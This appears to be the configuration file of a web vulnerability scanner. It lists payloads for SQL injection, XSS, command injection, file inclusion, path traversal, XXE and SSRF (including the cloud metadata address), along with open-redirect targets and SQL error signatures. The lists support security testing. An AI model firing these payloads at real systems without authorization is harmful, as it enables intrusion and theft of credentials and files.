# config.py

SQLI_PAYLOADS = [
    "'", "\"", "OR 1=1--", "' OR '1'='1",
    "\" OR \"1\"=\"1\"", "admin'--", "' OR 1=1#",
    "' OR 1=1 LIMIT 1--", "') OR ('1'='1"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "'\"><img src=x onerror=alert('XSS')>",
]

COMMAND_INJECTION_PAYLOADS = [
    ";id", "&& whoami", "| ls", "`cat /etc/passwd`",
    "| ping -c 1 127.0.0.1", "& dir"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
    "../../../../boot.ini", "../etc/shadow"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "..\\windows\\system.ini",
    "../../../../../etc/passwd", "..\\..\\..\\..\\boot.ini"
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY test SYSTEM "file:///c:/boot.ini">]><data>&test;</data>'
]

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost:80",
    "http://169.254.169.254/latest/meta-data"
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com",
    "///evil.com", "http://127.0.0.1"
]

IDOR_TEST_IDS = [
    "1", "2", "3", "4", "5", "6", "7"
]

SQL_ERROR_MESSAGES = [
    "you have an error in your sql syntax",
    "warning: mysql", "unclosed quotation mark",
    "syntax error", "odbc", "sqlexception",
    "mysql_fetch", "ora-", "nativeclient"
]

THREAD_COUNT = 10

